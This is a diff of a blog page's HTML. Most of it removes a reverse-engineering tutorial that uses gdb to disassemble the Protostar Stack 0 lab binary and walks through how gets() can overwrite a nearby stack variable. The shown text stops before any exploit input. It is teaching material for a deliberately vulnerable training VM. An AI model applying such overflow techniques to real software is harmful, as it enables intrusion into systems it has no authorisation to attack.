@@ -1,480 +1,144 @@
-<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage>
-<head>
-<meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="IE=edge">
-<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
-<title>Practical Reverse Engineering Tutorials Part 1: Introduction & Protostar Stack 0 - Shantanu Vs The World</title>
-<meta name=description content="What is this about? This article is the 1st part of the Practical Reverse Engineering Tutorials series. This series is geared towards a structured, but almost completely practical, approach to learn Reverse Engineering. Many of the existing articles/books take a long winded approach to teach RE which is prefixed with a lot of theory before the reader can get their hands dirty. This series will take a different approach of picking up various challenges in the order of increasing difficulty and help the reader in exploring ways how to break them.">
-<meta name=author content="Shantanu Goel"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"Shantanu Vs The World","url":"https:\/\/shantanugoel.com"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/shantanugoel.com"}</script>
-<script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/shantanugoel.com","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/shantanugoel.com\/2017\/11\/16\/practical-reverse-engineering-tutorial-1\/","name":"Practical reverse engineering tutorials part 1 introduction \u0026 protostar stack 0"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"Shantanu Goel"},"headline":"Practical Reverse Engineering Tutorials Part 1: Introduction \u0026 Protostar Stack 0","description":"What is this about? This article is the 1st part of the Practical Reverse Engineering Tutorials series. This series is geared towards a structured, but almost completely practical, approach to learn Reverse Engineering. Many of the existing articles/books take a long winded approach to teach RE which is prefixed with a lot of theory before the reader can get their hands dirty. This series will take a different approach of picking up various challenges in the order of increasing difficulty and help the reader in exploring ways how to break them.","inLanguage":"en","wordCount":2969,"datePublished":"2017-11-16T08:46:24","dateModified":"2017-11-16T08:46:24","image":"https:\/\/shantanugoel.com\/img\/avatar.jpg","keywords":["practical-reverse-engineering-tutorial-series","reverse-engineering","stack-buffer-overflow","buffer-overflow","gdb","protostar"],"mainEntityOfPage":"https:\/\/shantanugoel.com\/2017\/11\/16\/practical-reverse-engineering-tutorial-1\/","publisher":{"@type":"Organization","name":"https:\/\/shantanugoel.com","logo":{"@type":"ImageObject","url":"https:\/\/shantanugoel.com\/img\/avatar.jpg","height":60,"width":60}}}</script>
-<meta property="og:title" content="Practical Reverse Engineering Tutorials Part 1: Introduction & Protostar Stack 0">
-<meta property="og:description" content="What is this about? This article is the 1st part of the Practical Reverse Engineering Tutorials series. This series is geared towards a structured, but almost completely practical, approach to learn Reverse Engineering. Many of the existing articles/books take a long winded approach to teach RE which is prefixed with a lot of theory before the reader can get their hands dirty. This series will take a different approach of picking up various challenges in the order of increasing difficulty and help the reader in exploring ways how to break them.">
-<meta property="og:image" content="https://shantanugoel.com/img/avatar.jpg">
-<meta property="og:url" content="https://shantanugoel.com/2017/11/16/practical-reverse-engineering-tutorial-1/">
-<meta property="og:type" content="website">
-<meta property="og:site_name" content="Shantanu Vs The World">
-<meta name=twitter:title content="Practical Reverse Engineering Tutorials Part 1: Introduction & …">
-<meta name=twitter:description content="What is this about? This article is the 1st part of the Practical Reverse Engineering Tutorials series. This series is geared towards a structured, but almost completely practical, approach to learn …">
-<meta name=twitter:image content="https://shantanugoel.com/img/avatar.jpg">
-<meta name=twitter:card content="summary">
-<meta name=twitter:site content="@shantanugoel">
-<meta name=twitter:creator content="@shantanugoel">
-<link href=https://shantanugoel.com/img/avatar.jpg rel=icon type=image/x-icon>
-<meta name=generator content="Hugo 0.92.2">
-<link rel=alternate href=https://shantanugoel.com/index.xml type=application/rss+xml title="Shantanu Vs The World"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y crossorigin=anonymous>
-<link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous>
-<link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://shantanugoel.com/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
-<link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://shantanugoel.com/css/syntax.css><link rel=stylesheet href=https://shantanugoel.com/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous>
-<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-3966412-1','auto'),ga('send','pageview'))</script>
-<script async src=https://www.google-analytics.com/analytics.js></script>
-</head>
-<body>
-<nav class="navbar navbar-default navbar-fixed-top navbar-custom">
-<div class=container-fluid>
-<div class=navbar-header>
-<button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
+<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Practical Reverse Engineering Tutorials Part 1: Introduction & Protostar Stack 0 - Shantanu Vs The World</title><meta name=description content="What is this about? This article is the 1st part of the Practical Reverse Engineering Tutorials series. This series is geared towards a structured, but almost completely practical, approach to learn Reverse Engineering. Many of the existing articles/books take a long winded approach to teach RE which is prefixed with a lot of theory before the reader can get their hands dirty. This series will take a different approach of picking up various challenges in the order of increasing difficulty and help the reader in exploring ways how to break them."><meta name=author content="Shantanu Goel"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"Shantanu Vs The World","url":"https:\/\/shantanugoel.com"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/shantanugoel.com"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/shantanugoel.com","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/shantanugoel.com\/2017\/11\/16\/practical-reverse-engineering-tutorial-1\/","name":"Practical reverse engineering tutorials part 1 introduction \u0026 protostar stack 0"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"Shantanu Goel"},"headline":"Practical Reverse Engineering Tutorials Part 1: Introduction \u0026 Protostar Stack 0","description":"What is this about? This article is the 1st part of the Practical Reverse Engineering Tutorials series. This series is geared towards a structured, but almost completely practical, approach to learn Reverse Engineering. Many of the existing articles/books take a long winded approach to teach RE which is prefixed with a lot of theory before the reader can get their hands dirty. This series will take a different approach of picking up various challenges in the order of increasing difficulty and help the reader in exploring ways how to break them.","inLanguage":"en","wordCount":2969,"datePublished":"2017-11-16T08:46:24","dateModified":"2017-11-16T08:46:24","image":"https:\/\/shantanugoel.com\/img\/avatar.jpg","keywords":["practical-reverse-engineering-tutorial-series","reverse-engineering","stack-buffer-overflow","buffer-overflow","gdb","protostar"],"mainEntityOfPage":"https:\/\/shantanugoel.com\/2017\/11\/16\/practical-reverse-engineering-tutorial-1\/","publisher":{"@type":"Organization","name":"https:\/\/shantanugoel.com","logo":{"@type":"ImageObject","url":"https:\/\/shantanugoel.com\/img\/avatar.jpg","height":60,"width":60}}}</script><meta property="og:title" content="Practical Reverse Engineering Tutorials Part 1: Introduction & Protostar Stack 0"><meta property="og:description" content="What is this about? This article is the 1st part of the Practical Reverse Engineering Tutorials series. This series is geared towards a structured, but almost completely practical, approach to learn Reverse Engineering. Many of the existing articles/books take a long winded approach to teach RE which is prefixed with a lot of theory before the reader can get their hands dirty. This series will take a different approach of picking up various challenges in the order of increasing difficulty and help the reader in exploring ways how to break them."><meta property="og:image" content="https://shantanugoel.com/img/avatar.jpg"><meta property="og:url" content="https://shantanugoel.com/2017/11/16/practical-reverse-engineering-tutorial-1/"><meta property="og:type" content="website"><meta property="og:site_name" content="Shantanu Vs The World"><meta name=twitter:title content="Practical Reverse Engineering Tutorials Part 1: Introduction & …"><meta name=twitter:description content="What is this about? This article is the 1st part of the Practical Reverse Engineering Tutorials series. This series is geared towards a structured, but almost completely practical, approach to learn …"><meta name=twitter:image content="https://shantanugoel.com/img/avatar.jpg"><meta name=twitter:card content="summary"><meta name=twitter:site content="@shantanugoel"><meta name=twitter:creator content="@shantanugoel"><link href=https://shantanugoel.com/img/avatar.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.108.0"><link rel=alternate href=https://shantanugoel.com/index.xml type=application/rss+xml title="Shantanu Vs The World"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://shantanugoel.com/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://shantanugoel.com/css/syntax.css><link rel=stylesheet href=https://shantanugoel.com/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-3966412-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
 <span class=sr-only>Toggle navigation</span>
 <span class=icon-bar></span>
 <span class=icon-bar></span>
-<span class=icon-bar></span>
-</button>
-<a class=navbar-brand href=https://shantanugoel.com>Shantanu Vs The World</a>
-</div>
-<div class="collapse navbar-collapse" id=main-navbar>
-<ul class="nav navbar-nav navbar-right">
-<li>
-<a title href=https://twitter.com/shantanugoel/><i class="fab fa-twitter fa-stack-2x"></i></a>
-</li>
-<li>
-<a title=/blog href=/>/blog</a>
-</li>
-<li>
-<a title=/about href=/about/>/about</a>
-</li>
-<li>
-<a title=/archives href=/archives/>/archives</a>
-</li>
-<li>
-<a title=/categories href=/categories/>/categories</a>
-</li>
-</ul>
-</div>
-<div class=avatar-container>
-<div class=avatar-img-border>
-<a title="Shantanu Vs The World" href=https://shantanugoel.com>
-<img class=avatar-img src=https://shantanugoel.com/img/avatar.jpg alt="Shantanu Vs The World">
-</a>
-</div>
-</div>
-</div>
-</nav>
-<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
-<div class=pswp__bg></div>
-<div class=pswp__scroll-wrap>
-<div class=pswp__container>
-<div class=pswp__item></div>
-<div class=pswp__item></div>
-<div class=pswp__item></div>
-</div>
-<div class="pswp__ui pswp__ui--hidden">
-<div class=pswp__top-bar>
-<div class=pswp__counter></div>
-<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<span class=icon-bar></span></button>
+<a class=navbar-brand href=https://shantanugoel.com>Shantanu Vs The World</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title href=https://twitter.com/shantanugoel/><i class="fab fa-twitter fa-stack-2x"></i></a></li><li><a title=/blog href=/>/blog</a></li><li><a title=/about href=/about/>/about</a></li><li><a title=/archives href=/archives/>/archives</a></li><li><a title=/categories href=/categories/>/categories</a></li></ul></div><div class=avatar-container><div class=avatar-img-border><a title="Shantanu Vs The World" href=https://shantanugoel.com><img class=avatar-img src=https://shantanugoel.com/img/avatar.jpg alt="Shantanu Vs The World"></a></div></div></div></nav><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
 <button class="pswp__button pswp__button--share" title=Share></button>
 <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-<div class=pswp__preloader>
-<div class=pswp__preloader__icn>
-<div class=pswp__preloader__cut>
-<div class=pswp__preloader__donut></div>
-</div>
-</div>
-</div>
-</div>
-<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-<div class=pswp__share-tooltip></div>
-</div>
-<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-</button>
-<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-</button>
-<div class=pswp__caption>
-<div class=pswp__caption__center></div>
-</div>
-</div>
-</div>
-</div>
-<header class=header-section>
-<div class="intro-header no-img">
-<div class=container>
-<div class=row>
-<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-<div class=posts-heading>
-<h1>Practical Reverse Engineering Tutorials Part 1: Introduction & Protostar Stack 0</h1>
-<hr class=small>
-</div>
-</div>
-</div>
-</div>
-</div>
-</header>
-<div class=container role=main>
-<div class=row>
-<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-<nav id=TableOfContents>
-<ul>
-<li><a href=#what-is-this-about>What is this about?</a></li>
-<li><a href=#exploit-exercises--protostar>Exploit Exercises / Protostar</a></li>
-<li><a href=#setup>Setup</a></li>
-<li><a href=#stack-0>Stack 0</a>
-<ul>
-<li><a href=#preparing-for-the-challenge>Preparing for the challenge</a></li>
-<li><a href=#static-analysis>Static Analysis</a></li>
-<li><a href=#the-vulnerability>The vulnerability</a></li>
-<li><a href=#dynamic-analysis>Dynamic Analysis</a></li>
-<li><a href=#references--lessons-learnt>References / Lessons learnt</a></li>
-</ul>
-</li>
-</ul>
-</nav>
-<article role=main class=blog-post>
-<h2 id=what-is-this-about>What is this about?</h2>
-<p>This article is the 1st part of the <a href=/tags/practical-reverse-engineering-tutorial-series>Practical Reverse Engineering Tutorials</a> series. This series is geared towards a structured, but almost completely practical, approach to learn Reverse Engineering. Many of the existing articles/books take a long winded approach to teach RE which is prefixed with a lot of theory before the reader can get their hands dirty. This series will take a different approach of picking up various challenges in the order of increasing difficulty and help the reader in exploring ways how to break them. I&rsquo;ll try to keep mundane theory limited to the portions needed to beat the current challenge in consideration. Hopefully, this keeps the articles short, precise and interesting enough for readers to keep their attention span intact.</p>
-<p>I&rsquo;d like to believe that these articles will prove helpful to those who are completely new to the world of reverse engineering. But I hope that even intermediate level readers would be able to make use of these by picking up the articles according to their appropriate levels.</p>
-<p>Pre-requisite for these articles is basic knowledge of programming concepts, prefereably C. Any kind of prior experience with any assembly language is good but not mandatory.</p>
-<p>For any queries, suggestions or feedback, please leave a comment here or ping me <a href=https://twitter.com/shantanugoel>@shantanugoel</a></p>
-<h2 id=exploit-exercises--protostar>Exploit Exercises / Protostar</h2>
-<p>For the first few articles of this series, we&rsquo;ll work through some of the challenges from <a href=https://exploit-exercises.com>Exploit Exercises</a>, starting with <a href=https://exploit-exercises.com/protostar/>Protostar</a>.</p>
-<p>Note that although most of the challenges on exploit exercises provide source code of the challenge, we&rsquo;d try to hack our way using purely reverse engineering as much as possible without looking at the source code. This would lead to better learning and avoid guiding you towards the solution pre-maturely. I strongly recommend that you do not look at the C source unless you&rsquo;ve completed the below artcile fully or are not able to make connection to the assembly code at all after serious effort.</p>
-<h2 id=setup>Setup</h2>
-<p>To create the setup, follow the below steps:</p>
-<ul>
-<li>Download the Protostar ISO file from <a href=https://exploit-exercises.com/download/>https://exploit-exercises.com/download/</a></li>
-<li>Download and install VMWare Workstation Player or VirtualBox</li>
-<li>Create a new virtual machine in the vm software you downloaded using the nebula ISO from the first step</li>
-<li>The iso is a live CD, so you can boot from it directly, instead of having to install it in the VM</li>
-</ul>
-<p>We&rsquo;re all set now to begin</p>
-<h2 id=stack-0>Stack 0</h2>
-<p><a href=https://exploit-exercises.com/protostar/stack0/>Stack0</a> is the first challenge in protostar.</p>
-<h3 id=preparing-for-the-challenge>Preparing for the challenge</h3>
-<p>The webpage says that the challenge is located at <code>/opt/protostar/bin/stack0</code>, so login to the VM and run this program. It looks like it is waiting for some input. On entering any data, it seems to tell us we were wrong with a message <code>Try again?</code></p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ ./stack0
-asd
-Try again?
-user@protostar:/opt/protostar/bin$ 
-</code></pre></div><p>We run <code>strings</code> command on the stack0 program to find out interesting text present in it, and see another one <code>you have changed the 'modified' variable</code>, which seems to be our target.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ strings stack0
-/lib/ld-linux.so.2
-__gmon_start__
-libc.so.6
-_IO_stdin_used
-gets
-puts
-__libc_start_main
-GLIBC_2.0
-PTRh@
-<span style=color:#f92672>[</span>^_<span style=color:#f92672>]</span>
-you have changed the <span style=color:#e6db74>&#39;modified&#39;</span> variabley
-Try again?
-user@protostar:/opt/protostar/bin$ 
-</code></pre></div><h3 id=static-analysis>Static Analysis</h3>
-<p>Now that we know what we need to achieve, we start our reverse engineering by doing static analysis of the program. There are several utilities to look at the low level code of the program. However, we will be using <code>gdb</code> here which can help us later in dynamic analysis as well. gdb or The GNU Project Debugger is a popular open source debugger. We&rsquo;ll graduate to more powerful tools or use reverse engineering oriented plugins for gdb later, but for now a vanilla gdb will do. It is already installed in the protostar VM. A debugger allows us to examine the internal state of the program as it executes at instruction/register level.</p>
-<p>Some of the important commands that you&rsquo;d use during the static analysis for this challenge are:</p>
-<p><code>set disassembly-flavor intel</code>: While this is optional, but it allows to see the disassembled code in a more readable format.</p>
-<p><code>disassemble &lt;function></code>: This command displays the disassembled code of <code>function</code></p>
-<p>You can read more about these commands at <a href=https://sourceware.org/gdb/current/onlinedocs/gdb/>https://sourceware.org/gdb/current/onlinedocs/gdb/</a> or <a href=http://visualgdb.com/gdbreference/commands/>http://visualgdb.com/gdbreference/commands/</a></p>
-<p>Using the above information, we load the <code>stack0</code> executable in GDB and disassemble the function <code>main</code>.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ gdb stack0
-GNU gdb <span style=color:#f92672>(</span>GDB<span style=color:#f92672>)</span> 7.0.1-debian
-Copyright <span style=color:#f92672>(</span>C<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version <span style=color:#ae81ff>3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type <span style=color:#e6db74>&#34;show copying&#34;</span>
-and <span style=color:#e6db74>&#34;show warranty&#34;</span> <span style=color:#66d9ef>for</span> details.
-This GDB was configured as <span style=color:#e6db74>&#34;i486-linux-gnu&#34;</span>.
-For bug reporting instructions, please see:
-&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
-Reading symbols from /opt/protostar/bin/stack0...done.
-<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> set disassembly-flavor intel
-<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disassemble main
-Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> main:
-0x080483f4 &lt;main+0&gt;:	push   ebp
-0x080483f5 &lt;main+1&gt;:	mov    ebp,esp
-0x080483f7 &lt;main+3&gt;:	and    esp,0xfffffff0
-0x080483fa &lt;main+6&gt;:	sub    esp,0x60
-0x080483fd &lt;main+9&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp+0x5c<span style=color:#f92672>]</span>,0x0
-0x08048405 &lt;main+17&gt;:	lea    eax,<span style=color:#f92672>[</span>esp+0x1c<span style=color:#f92672>]</span>
-0x08048409 &lt;main+21&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,eax
-0x0804840c &lt;main+24&gt;:	call   0x804830c &lt;gets@plt&gt;
-0x08048411 &lt;main+29&gt;:	mov    eax,DWORD PTR <span style=color:#f92672>[</span>esp+0x5c<span style=color:#f92672>]</span>
-0x08048415 &lt;main+33&gt;:	test   eax,eax
-0x08048417 &lt;main+35&gt;:	je     0x8048427 &lt;main+51&gt;
-0x08048419 &lt;main+37&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,0x8048500
-0x08048420 &lt;main+44&gt;:	call   0x804832c &lt;puts@plt&gt;
-0x08048425 &lt;main+49&gt;:	jmp    0x8048433 &lt;main+63&gt;
-0x08048427 &lt;main+51&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,0x8048529
-0x0804842e &lt;main+58&gt;:	call   0x804832c &lt;puts@plt&gt;
-0x08048433 &lt;main+63&gt;:	leave  
-0x08048434 &lt;main+64&gt;:	ret    
-End of assembler dump.
-<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> 
-</code></pre></div><h4 id=making-sense-of-the-assembly-code>Making sense of the assembly code</h4>
-<p>Well, so we got a&mldr;.big pile of gibberish? So, this is how assembly code looks like. Very different from a regular C program, as you can see. On the left side, you can see the memory addresses where a particular instruction is present and on the right side the instruction. Each instruction is again composed of two parts:</p>
-<ul>
-<li>The instruction itself</li>
-<li>0 or more operands (which can be addresses or registers with some specific formatting that we will learn as we encounter it)</li>
-</ul>
-<p>Now, although this is a small enough program, as good reverse engineers, we rarely go through the whole program immediately which would require us to know each assembly instruction as well as take a lot of time. So, instead we will make some intelligent guesses and look at only the instructions/code that we really need to know. Just know these basic things before moving forward:</p>
-<ul>
-<li>Any instruction that works on some data either takes one or more addresses and/or registers as operands, which it operates on</li>
-<li>A register like eax is a basically a temporary/scratch memory close to the CPU for getting fast access to a data being used locally frequently</li>
-<li>There are few special registers. For current problem, know that ebp is the Stack Base pointer or the bottom of current stack frame, esp is the stack pointer or the current top of the stack, eip is the instruction pointer or the address of the instruction which is just about to be executed. We&rsquo;ll learn more about the ebp/esp when we do a real stack overflow problem</li>
-<li>A square bracket <code>[]</code> around a address or register signifies that the instruction refers to the value present in that address/register as the source or destination of the operation instead of the address/register itself.</li>
-<li>For most operations involving a source and destination operand, the left operand is the destination.</li>
-</ul>
-<p>If you face problem in understanding the below information and think you need to understand x86 assembly a bit more before moving forward, you can use this very short and simple guide for the same: <a href=https://www.cs.virginia.edu/~evans/cs216/guides/x86.html>https://www.cs.virginia.edu/~evans/cs216/guides/x86.html</a></p>
-<p>Many times, my first intuition is to find out the areas in code which lead to our success/failure cases and work backwards from there. From our preparation phase, we saw that the failure case printed a message <code>Try again?</code> on the screen and the success case was potentially a message <code>you have changed the 'modified' variable</code>. Skimming over the code quickly, you will notice 3 peculiar statements that you may already be familiar from your C programming.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>0x0804840c &lt;main+24&gt;:	call   0x804830c &lt;gets@plt&gt;
-...
-0x08048420 &lt;main+44&gt;:	call   0x804832c &lt;puts@plt&gt;
-...
-0x0804842e &lt;main+58&gt;:	call   0x804832c &lt;puts@plt&gt;
-</code></pre></div><p>If you don&rsquo;t remember what <code>gets</code> and <code>puts</code> do, you can look at their descriptions from their manpages (e.g. <code>man puts</code>). In brief, <code>gets</code> allows you to capture user input from stdin and <code>puts</code> allows you to print output to stdout to display to the user. This matches with our observations in the previous section that it waited for user input when we ran the program and gave an error message on receiving the input. We also saw a 2nd string which was potentially the success message. So we have 1 gets and 2 puts statements corresponding to this, but we don&rsquo;t know yet which one of the 2 puts statements is the success part and which one is the failure part.</p>
-<p>Anyways, we start moving a bit backwards from the first puts statement and try to make sense of each instruction:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>0x08048420 &lt;main+44&gt;:	call   0x804832c &lt;puts@plt&gt;
-</code></pre></div><p>Here, the <code>call</code> instruction refers to calling a function specified by the address 0x804832c. The string inside &lt;> is the disassembler telling you the symbol name associated with that address.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>0x08048419 &lt;main+37&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,0x8048500
-</code></pre></div><p>Here, the <code>mov</code> instruction is moving the value 0x8048500 into the address pointed by the register esp. The X86 calling convention puts the arguments to a function onto the stack before calling it and here the esp is the &ldquo;Stack pointer&rdquo; register. So, this must be the address of the string being passed to puts that it must print. Keep this address 0x8048500 in mind for our next section (Dynamic Analysis).</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>0x08048411 &lt;main+29&gt;:	mov    eax,DWORD PTR <span style=color:#f92672>[</span>esp+0x5c<span style=color:#f92672>]</span>
-0x08048415 &lt;main+33&gt;:	test   eax,eax
-0x08048417 &lt;main+35&gt;:	je     0x8048427 &lt;main+51&gt;
-</code></pre></div><p>Here we see that first we move some data from the address esp + 0x5c into eax. then the <code>test</code> instruction checks whether eax is zero or not. It does this by AND&rsquo;ing the left and right operand. Since eax is the left as well as the right operand, the AND result will be zero only if eax is zero. Then the <code>je</code> (or jump if equal to) instruction will jump the program execution to the address 0x8048427 (i.e. it will skip the first puts statement and start executing near our 2nd puts statement) if eax was zero. Otherwise it will execute the first puts statement. It decides the &ldquo;equal to&rdquo; condition by looking at an internal flag called Zero Flag (or Z or ZF) and treats equals condition to be true if this flag is set. This is because a <code>test</code> or a <code>cmp</code> (compare) instruction will set the ZF to 1 if result of the AND of 2 operands (in case of test) or difference of 2 operands (in case of cmp) was 0.</p>
-<p>This seems like our decision maker code as if we can manipulate the value at [esp+0x5c] then we can control the flow of the program to either of the puts statements. So, let&rsquo;s keep this address in mind for our dynamic analysis.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>0x08048405 &lt;main+17&gt;:	lea    eax,<span style=color:#f92672>[</span>esp+0x1c<span style=color:#f92672>]</span>
-0x08048409 &lt;main+21&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,eax
-0x0804840c &lt;main+24&gt;:	call   0x804830c &lt;gets@plt&gt;
-</code></pre></div><p>Finally we reach the user input call. <code>lea</code> instruction means &ldquo;Load effective address&rdquo;. It is a slightly tricky instruction in the sense that:</p>
-<ul>
-<li>it does the calculations only on the right side operand, not both and then stores the result in left operand</li>
-<li>the square brackets [] don&rsquo;t really refer to the meaning that we know from other instructions (i.e. you dont need to find out further the value present at calculated address and can just ignore the [])</li>
-</ul>
-<p>Combining this knowledge with the semantics of mov/call that we learnt earlier, we know that the program is collecting the user input and storing that into a location starting at esp+0x1c.</p>
